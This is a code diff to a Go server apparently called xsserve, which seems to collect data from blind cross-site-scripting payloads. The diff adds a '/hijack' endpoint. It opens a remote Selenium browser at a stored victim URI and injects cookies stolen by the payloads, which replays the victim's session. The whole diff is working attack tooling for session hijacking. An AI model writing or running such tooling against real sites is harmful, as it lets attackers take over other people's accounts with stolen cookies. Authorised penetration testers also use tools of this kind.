@@ -11,6 +11,7 @@ import (
 	"xsserve/core"
 	"xsserve/database"
 
+	"github.com/tebeka/selenium"
 	"go.mongodb.org/mongo-driver/bson"
 	"go.mongodb.org/mongo-driver/bson/primitive"
 )
@@ -32,6 +33,7 @@ func ServeUI(currentFlags *core.Flags) (err error) {
 	triggers := http.HandlerFunc(triggersHandle)
 	payloads := http.HandlerFunc(payloadsHandler)
 	getScreenshot := http.HandlerFunc(getScreenshotHandler)
+	hijackSession := http.HandlerFunc(hijackSessionHandle)
 
 	mux.Handle("/favicon.ico", favicon)
 	mux.Handle("/dashboard", index)
@@ -39,6 +41,7 @@ func ServeUI(currentFlags *core.Flags) (err error) {
 	mux.Handle("/report", report)
 	mux.Handle("/payloads", payloads)
 	mux.Handle("/get/screenshot", getScreenshot)
+	mux.Handle("/hijack", hijackSession)
 
 	//TODO: fix, The script from “http://host/static/resources/ui/js/main.js” was loaded even though its MIME type (“text/plain”) is not a valid JavaScript MIME type.
 	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(StaticFS))))
@@ -104,6 +107,56 @@ func triggersHandle(w http.ResponseWriter, r *http.Request) {
 		log.Println(err)
 		http.Error(w, "Internal Server Error", 500)
 	}
+}
+
+func hijackSessionHandle(w http.ResponseWriter, r *http.Request) {
+	/*Basic auth*/
+	checkAutorization(w, r)
+
+	// Setup node capabilities
+	caps := selenium.Capabilities{"browserName": flags.SeleniumBrowser}
+	log.Println(flags.SeleniumBrowser)
+	log.Println(flags.SeleniumURL)
+	log.Println(caps)
+
+	wd, err := selenium.NewRemote(caps, flags.SeleniumURL)
+	if err != nil {
+		log.Println(err)
+	}
+	//defer wd.Quit()
+
+	objID, err := primitive.ObjectIDFromHex(r.URL.Query().Get("id"))
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+	}
+
+	var trigger core.Trigger
+	err = database.DB.Collection("triggers").FindOne(database.CTX, bson.M{"_id": objID.Hex()}).Decode(&trigger)
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+	}
+
+	// Navigate to the simple playground interface. //
+	if err := wd.Get(trigger.URI); err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+	}
+
+	// Set the cookies
+	for _, cookie := range trigger.Cookies {
+		log.Println(cookie)
+		wd.AddCookie(&selenium.Cookie{
+			Domain: cookie.Domain,
+			Name:   cookie.Name,
+			Value:  cookie.Value,
+			Path:   cookie.Path,
+			Expiry: uint(cookie.Expires.Unix()),
+			Secure: cookie.Secure,
+		})
+	}
+	//wd.Refresh() // Refresh the page after cookies are added?
 }
 
 func reportHandle(w http.ResponseWriter, r *http.Request) {
